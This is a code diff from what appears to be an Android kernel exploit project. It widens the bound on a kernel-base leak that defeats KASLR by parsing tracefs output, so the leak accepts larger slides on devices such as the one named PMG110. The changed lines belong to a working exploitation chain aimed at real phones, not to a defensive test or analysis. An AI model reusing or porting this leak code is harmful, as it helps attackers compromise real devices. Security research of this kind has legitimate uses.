@@ -1,6 +1,15 @@
 #include "common.h"
 
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+/* Largest accepted kernel text slide. The default is the Samsung range: those
+ * kernels randomise placement in 64KB steps inside 2MB, so the virtual slide
+ * and the physical P0 offset are the same small number. Devices whose KASLR
+ * moves the text base across the whole kernel VA region raise it in target.h --
+ * PMG110 was measured at 0x1F1F000000, which this bound rejected even though
+ * the leak itself was correct. */
+#ifndef SLIDE_MAX_KASLR_OFFSET
+#define SLIDE_MAX_KASLR_OFFSET 0x1f0000ULL
+#endif
 #ifndef SLIDE_TRACEFS_EVENT_ID
 #define SLIDE_TRACEFS_EVENT_ID 109
 #endif
@@ -60,7 +69,7 @@ static int slide_tracefs_parse_page(
           KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
       if (caller >= link_caller) {
         uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+        if (candidate <= SLIDE_MAX_KASLR_OFFSET && (candidate & 0xffffULL) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
@@ -140,7 +149,7 @@ int slide_leak_kernel_base(void) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
-    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
+    if (errno || end == forced_offset_arg || *end || value > SLIDE_MAX_KASLR_OFFSET ||
         (value & 0xffffULL) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
